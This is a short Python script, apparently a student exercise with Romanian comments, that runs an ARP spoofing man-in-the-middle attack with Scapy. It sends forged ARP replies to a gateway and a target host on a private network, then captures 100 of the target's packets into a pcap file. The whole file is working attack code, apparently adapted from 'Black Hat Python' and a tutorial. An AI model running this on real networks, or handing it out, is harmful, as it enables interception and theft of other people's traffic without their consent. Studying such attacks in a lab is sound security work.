# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
# https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/

from scapy.all import ARP, send, conf, getmacbyip, sniff, wrpcap
from threading import Thread
from time import sleep
from sys import exit

conf.verb = 0 # nu vreau loguri aiurea
conf.iface = "eth0"

# tupluri (ip, mac) pentru gateway si target
gateway = ("198.7.0.1", getmacbyip("198.7.0.1"))
target  = ("198.7.0.2", getmacbyip("198.7.0.2"))

def arp_poison(gateway, target):
    print("Started ARP spoofing attack")
    
    gateway_ip, gateway_mac = gateway
    target_ip, target_mac = target
    
    try: 
        while True:
            # fac tabela ARP a gateway-ului sa creada ca sunt target-ul
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            # fac tabela ARP a target-ului sa creada ca sunt gateway-ul
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            sleep(1) # sa nu facem flood
    except KeyboardInterrupt:
        print("Stopped ARP spoofing attack")
        exit(0)

# rulam poisoning ul pe alt thread ca sa putem face sniff la pachete 
poison_thread = Thread(target=arp_poison, args=(gateway, target))
poison_thread.start()

try: 
    print("Started sniffing packets")
    sniff_filter = "ip host {}".format(target[0])
    # sniff-uim 100 de pachete care sunt trimise sau destinate targetului
    sniffed_packets = sniff(filter=sniff_filter, iface=conf.iface, count=100)
    print("Stopped sniffing packets")
    wrpcap(filename=f"{target[0]}-capture.pcap", pkt=sniffed_packets) 
except KeyboardInterrupt:
   print("Stopped sniffing packets")
   exit(0)